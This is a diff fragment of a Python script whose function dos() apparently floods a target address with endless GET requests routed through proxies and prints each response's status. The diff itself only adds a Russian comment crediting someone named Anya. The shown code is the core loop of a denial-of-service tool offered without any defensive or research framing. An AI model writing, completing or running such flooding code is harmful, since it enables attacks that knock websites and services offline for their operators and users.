@@ -23,7 +23,7 @@ def dos(pro):
     a = 1
     while a==1:
         try:
-            resp = requests.get(ip, headers=headers, proxies=proxies)
+            resp = requests.get(ip, headers=headers, proxies=proxies) #Я ЛЮБЛЮ АНЮ, СКАЖИ СПАСИБО ЕЙ ЗА ЭТОТ СКРИПТ
             print(f"ip: {resp.text} Результат: {resp.status_code}")
         except:
             print("Неудачное подключение!")
